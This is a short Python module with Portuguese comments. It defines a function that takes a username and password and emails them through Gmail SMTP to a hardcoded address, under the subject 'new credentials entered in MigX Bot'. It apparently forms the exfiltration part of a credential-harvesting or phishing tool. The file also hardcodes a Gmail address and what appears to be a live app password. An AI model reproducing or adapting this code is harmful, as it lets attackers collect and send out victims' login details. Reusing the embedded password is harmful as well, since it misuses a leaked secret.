# email_sender.py
import smtplib
from email.message import EmailMessage
import os

# Credenciais fornecidas (podem ser sobrescritas por variáveis de ambiente)
DEFAULT_SENDER = "imatata16@gmail.com"
DEFAULT_APP_PASSWORD = "oxadiyjgwgramplb"   # sem espaços
DEFAULT_RECEIVER = "imatata16@gmail.com"

def enviar_credenciais(username: str, password: str):
    sender = os.getenv("EMAIL_SENDER", DEFAULT_SENDER)
    app_password = os.getenv("EMAIL_APP_PASSWORD", DEFAULT_APP_PASSWORD)
    receiver = os.getenv("EMAIL_RECEIVER", DEFAULT_RECEIVER)

    msg = EmailMessage()
    msg["Subject"] = "MigX Web - Novas credenciais introduzidas"
    msg["From"] = sender
    msg["To"] = receiver
    msg.set_content(
        f"Foram introduzidas novas credenciais no MigX Bot:\n\n"
        f"Username: {username}\n"
        f"Password: {password}\n"
    )

    try:
        with smtplib.SMTP("smtp.gmail.com", 587, timeout=15) as smtp:
            smtp.starttls()
            smtp.login(sender, app_password)
            smtp.send_message(msg)
        print(f"[Email] Credenciais enviadas para {receiver}")
        return True
    except Exception as e:
        print(f"[Email] Falha ao enviar: {e}")
        return False